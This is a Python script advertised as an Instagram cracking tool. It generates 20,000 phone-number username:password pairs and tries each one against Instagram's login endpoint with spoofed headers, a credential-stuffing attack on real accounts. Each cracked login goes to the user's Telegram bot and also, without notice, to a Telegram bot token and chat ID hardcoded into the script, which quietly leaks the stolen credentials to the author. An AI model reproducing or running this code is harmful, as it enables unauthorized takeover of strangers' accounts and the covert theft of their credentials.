#Coding By danyar.code sponser yy hama yy
#Tool Crack Instagram By Combo
#Program python


import requests,os,sys,time,datetime
import random
from datetime import datetime
import user_agent
from user_agent import generate_user_agent
os.system("clear")
os.system("xdg-open https://www.instagram.com/yy_hama_yy/")
os.system("clear")
print("You Need Account Telegram\n")
nia = input("")
id_telgram=int(input("Id Telegram :"))
bot_token=input("Token Bot :")

logo = """
   ____     ____   __  __   
U /"___|uU | __")u \ \/"/   
\| |  _ / \|  _ \/ /\  /\   
 | |_| |   | |_) |U /  \ u  
  \____|   |____/  /_/\_\   
  _)(|_   _|| \\_,-,>> \\_  
 (__)__) (__) (__)\_)  (__) 
    **************************************
    * -> Instagram: yy_hama_yy           *
    * -> Telegram: https://T.me/iiyiyiyi *
    ************************************** 
"""
#print(logo)
#exit()
good =0
p=generate_user_agent()
bad =0
eror =0
timeblock =0
def combo_number():
	txt_num = open("combo.txt","w")
	os.system("clear")
	print(logo)
	print("\n-----------------------------------\n")
	print("STOP FOR COMBO NUMBER ")
	time.sleep(1)
	print("===================%40")
	time.sleep(2)
	print("===================================%60")
	time.sleep(2)
	print("=============================================%100")
	num = "123456789010284647104"
	korak = "0750","0770","0751","0772","0773"
	print(korak)
	t=input("\n\nChoice :")
	for x in range(20000):
		ra = random.choice(num)
		ra2 = random.choice(num)
		ra3 = random.choice(num)
		ra4 = random.choice(num)
		ra5 = random.choice(num)
		ra6 = random.choice(num)
		ra7 = random.choice(num)
		hamwi = t+ra+ra2+ra3+ra4+ra5+ra6+ra7
		txt_num.write(hamwi+":"+hamwi+"\n")
	time.sleep(2)
	print("\nCOMBO MAKE SUCCESSFULL :)")
	time.sleep(2)
	os.system("clear")
		
		
		
		
#combo_number()
		
		
		
		
		
def star():
	filer = open("Good.txt","w")
	filer2 = open("Checkpoint.txt","w")
	print(logo)
	bad = 0
	good = 0
	eroor = 0
	timeblock=0
	tele=0
	point=0
	ope = open("combo.txt","r").readlines()
	try:
		for dd in ope:
			time.sleep(1)
			ux = dd.strip()
			double = ux.split(":")
			yakam = double[0]
			dwam = double[1]
			url_insta = 'https://www.instagram.com/accounts/login/ajax/'
			head_insta= {
                        'accept':'*/*',
                        'accept-encoding':'gzip,deflate,br',
                        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
                        'content-length':'269',
                        'content-type':'application/x-www-form-urlencoded',
                        'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
                        'origin':'https://www.instagram.com',
                        'referer':'https://www.instagram.com/',
                        'sec-fetch-dest':'empty',
                        'sec-fetch-mode':'cors',
                        'sec-fetch-site':'same-origin',
                        'user-agent':p ,
                        'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
                        'x-ig-app-id':'936619743392459',
                        'x-ig-www-claim':'0',
                        'x-instagram-ajax':'8a8118fa7d40',
                        'x-requested-with':'XMLHttpRequest'
			}
			time_now = int(datetime.now().timestamp())
			data_insta = {
                        'username': yakam,
                        'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+dwam,
                        'queryParams': {},
                        'optIntoOneTap': 'false'
			}
			end = requests.post(url_insta,headers=head_insta,data=data_insta).text
			try:
				if '"message":"checkpoint_required"' in end:
					os.system("clear")
					point+=1
					print(logo)
					print("--------------------------------")
					print("\nPleas Wait 1h For End Crack ...!\n")
					print("\033[1;32;40mGOOD :{}\033[1;37;40m".format(good))
					print("\033[1;31;40mBAD :{}\033[1;37;40m".format(bad))
					print("\033[34mCHECKPOINT :{}\033[37m".format(point))
					print("\033[1;33;40mTIME BLOCK :{}\033[1;37;40m".format(timeblock))
					print("\033[1;33;40mEROOR :{}\033[1;37;40m".format(eroor))
					print("\033[1;33;40mSEND FOR TELGRAM :{}\033[1;37;40m".format(tele))
					filer.write(ux+"\n")
					filer2.write(ux+"\n")
				if 'userId' in end:
					good+=1
					tele+=1
					os.system("clear")
					print(logo)
					print("--------------------------------")
					print("\nPleas Wait 1h For End Crack ...!\n")
					print("\033[1;32;40mGOOD :{}\033[1;37;40m".format(good))
					print("\033[1;31;40mBAD :{}\033[1;37;40m".format(bad))
					print("\033[34mCHECKPOINT :{}\033[37m".format(point))
					print("\033[1;33;40mTIME BLOCK :{}\033[1;37;40m".format(timeblock))
					print("\033[1;33;40mEROOR :{}\033[1;37;40m".format(eroor))
					print("\033[1;33;40mSEND FOR TELGRAM :{}\033[1;37;40m".format(tele))
					filer.write(ux+"\n")
					telgram ='https://api.telegram.org/bot1899714420:AAE7FDeGDjyp9LTtKCPkAWv4a6BK58rafMQ/sendMessage?chat_id=1834920246&parse_mode=Markdown&text=-------Admin-------\nGood \n{}\n-------Admin-------'.format(ux)
					benera_tele=requests.get(telgram)
					user_termux='https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + str(id_telgram)+ '&parse_mode=Markdown&text=GOOD \n' + ux
					benera_user=requests.get(user_termux)
				if '"message":"Please wait a few minutes before you try again."' in end:
					timeblock+=1
					os.system("clear")
					print(logo)
					print("--------------------------------")
					print("\nPleas Wait 1h For End Crack ...!\n")
					print("\033[1;32;40mGOOD :{}\033[1;37;40m".format(good))
					print("\033[1;31;40mBAD :{}\033[1;37;40m".format(bad))
					print("\033[34mCHECKPOINT :{}\033[37m".format(point))
					print("\033[1;33;40mTIME BLOCK :{}\033[1;37;40m".format(timeblock))
					print("\033[1;33;40mEROOR :{}\033[1;37;40m".format(eroor))
					print("\033[1;33;40mSEND FOR TELGRAM :{}\033[1;37;40m".format(tele))
					time.sleep(200)
				if '"authenticated":false' in end:
					os.system("clear")
					print(logo)
					print("--------------------------------")
					print("\nPleas Wait 1h For End Crack ...!\n")
					bad+=1
					print("\033[1;32;40mGOOD :{}\033[1;37;40m".format(good))
					print("\033[1;31;40mBAD :{}\033[1;37;40m".format(bad))
					print("\033[34mCHECKPOINT :{}\033[37m".format(point))
					print("\033[1;33;40mTIME BLOCK :{}\033[1;37;40m".format(timeblock))
					print("\033[1;33;40mEROOR :{}\033[1;37;40m".format(eroor))
					print("\033[1;33;40mSEND FOR TELGRAM :{}\033[1;37;40m".format(tele))
				else:
					eroor+=1
					os.system("clear")
					print(logo)
					print("--------------------------------")
					print("\nPleas Wait 1h For End Crack ...!\n")
					print("\033[1;32;40mGOOD :{}\033[1;37;40m".format(good))
					print("\033[1;31;40mBAD :{}\033[1;37;40m".format(bad))
					print("\033[34mCHECKPOINT :{}\033[37m".format(point))
					print("\033[1;33;40mTIME BLOCK :{}\033[1;37;40m".format(timeblock))
					print("\033[1;33;40mEROOR :{}\033[1;37;40m".format(eroor))
					print("\033[1;33;40mSEND FOR TELGRAM :{}\033[1;37;40m".format(tele))
			except:
				pass
	except:
		print("Hallayak la Combo ka haya ")
#star()
combo_number()
star()

#xushkt bgem hi